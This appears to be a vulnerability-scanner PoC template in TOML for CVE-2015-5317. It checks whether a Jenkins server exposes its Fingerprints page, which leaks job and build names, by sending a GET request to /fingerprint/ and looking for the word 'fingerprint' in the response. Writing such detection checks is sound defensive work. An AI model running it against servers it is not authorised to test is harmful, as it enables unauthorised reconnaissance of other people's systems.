[info]
author = "ave"
description = "验证Jenkins Fingerprints页面信息泄露漏洞，未经认证的远程攻击者可通过直接访问Fingerprints页面获取敏感作业和构建名称信息"
id = "POC-AVE-2015-0608"
name = "CVE-2015-5317 PoC"
severity = "high"
tags = ["ave-2015-0608"]
vuln_id = [
    "CVE-2015-5317",
    "AVE-2015-0608",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/fingerprint/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["fingerprint"]
